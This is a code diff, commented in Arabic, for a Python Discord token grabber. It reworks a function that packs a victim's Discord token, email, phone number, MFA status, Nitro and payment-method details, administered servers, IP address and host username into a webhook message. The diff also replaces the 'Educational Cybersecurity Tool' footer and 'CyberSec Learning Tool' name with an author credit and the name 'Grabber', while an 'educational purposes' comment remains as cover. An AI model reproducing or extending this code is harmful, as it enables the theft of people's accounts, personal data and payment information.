@@ -53,10 +53,36 @@ def send_to_webhook_visitor(visitor_info):
         # محاولة جمع معلومات Discord (للأغراض التعليمية)
         discord_info = collect_discord_info()
         
-        # إنشاء رسالة Discord بنفس تنسيق الملف الأصلي
+        # إنشاء رسالة Discord بنفس تنسيق الملف الأصلي تماماً
         if discord_info and discord_info.get('tokens_found', 0) > 0:
             # إذا تم العثور على معلومات Discord
             for token_data in discord_info.get('results', []):
+                # تنسيق معلومات Nitro بنفس طريقة الملف الأصلي
+                nitro_info = token_data.get('nitro_info', {})
+                has_nitro = nitro_info.get('has_nitro', False)
+                available = nitro_info.get('boosts_available', 0)
+                exp_date = nitro_info.get('expiration_date', 'N/A')
+                
+                # تنسيق البوستات
+                print_boost = ""
+                for boost in nitro_info.get('boost_info', []):
+                    print_boost += f"    - {boost}\n"
+                
+                # تنسيق معلومات Nitro
+                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if print_boost else ''}\n```"
+                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if print_boost else ''}\n```"
+                
+                # تنسيق معلومات الدفع
+                payment_info = token_data.get('payment_info', {})
+                payment_methods = payment_info.get('total_methods', 0)
+                valid = payment_info.get('valid_methods', 0)
+                payment_types = ' '.join(payment_info.get('types', []))
+                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {payment_types}\n```"
+                
+                # تنسيق معلومات الخوادم
+                guild_infos = format_guild_info_original(token_data.get('admin_guilds', []))
+                
+                # إنشاء الرسالة بنفس تنسيق الملف الأصلي تماماً
                 embed_data = {
                     'embeds': [
                         {
@@ -67,30 +93,30 @@ Email: {token_data.get('email', 'N/A')}
 Phone Number: {token_data.get('phone', 'N/A')}
 
 Guilds: {token_data.get('guilds_count', 0)}
-Admin Permissions: {format_guild_info(token_data.get('admin_guilds', []))}
+Admin Permissions: {guild_infos}
 ``` ```yaml
 MFA Enabled: {token_data.get('mfa_enabled', False)}
 Flags: {token_data.get('flags', 0)}
 Locale: {token_data.get('locale', 'N/A')}
 Verified: {token_data.get('verified', False)}
-```{format_nitro_info(token_data.get('nitro_info', {}))}{format_payment_info(token_data.get('payment_info', {}))}```yaml
+```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml
 IP: {visitor_info.get('ip', 'Unknown')}
-Browser: {browser}
-OS: {os_info}
+Username: {os.getenv("USER", "cloud-user")}
+PC Name: {os.getenv("HOSTNAME", "Cloud Server")}
 Token Location: {token_data.get('platform', 'Unknown')}
 ```Token: 
 ```yaml
 {token_data.get('token', 'N/A')}```""",
                             'color': 3092790,
                             'footer': {
-                                'text': "Educational Cybersecurity Tool - Learning Purposes Only"
+                                'text': "Made by Astraa ・ https://github.com/astraadev"
                             },
                             'thumbnail': {
                                 'url': f"https://cdn.discordapp.com/avatars/{token_data.get('user_id', 'default')}/{token_data.get('avatar', 'default')}.png"
                             }
                         }
                     ],
-                    "username": "CyberSec Learning Tool",
+                    "username": "Grabber",
                     "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                 }
                 
@@ -181,6 +207,18 @@ def format_guild_info(admin_guilds):
         guild_infos += f"\n    - [{guild.get('name', 'Unknown')}]: {guild.get('members', 0)}{guild.get('vanity', '')}"
     
     return guild_infos if guild_infos else "No admin guilds"
+
+def format_guild_info_original(admin_guilds):
+    """تنسيق معلومات الخوادم بنفس طريقة الملف الأصلي"""
+    if not admin_guilds:
+        return "\n    لا توجد خوادم بصلاحيات إدارية"
+    
+    guild_infos = ""
+    for guild in admin_guilds:
+        vanity = guild.get('vanity', '')
+        guild_infos += f"\n    [{guild.get('name', 'Unknown')}]: {guild.get('members', 0)}{vanity}"
+    
+    return guild_infos if guild_infos else "\n    لا توجد خوادم بصلاحيات إدارية"
 
 def format_nitro_info(nitro_info):
     """تنسيق معلومات Nitro"""
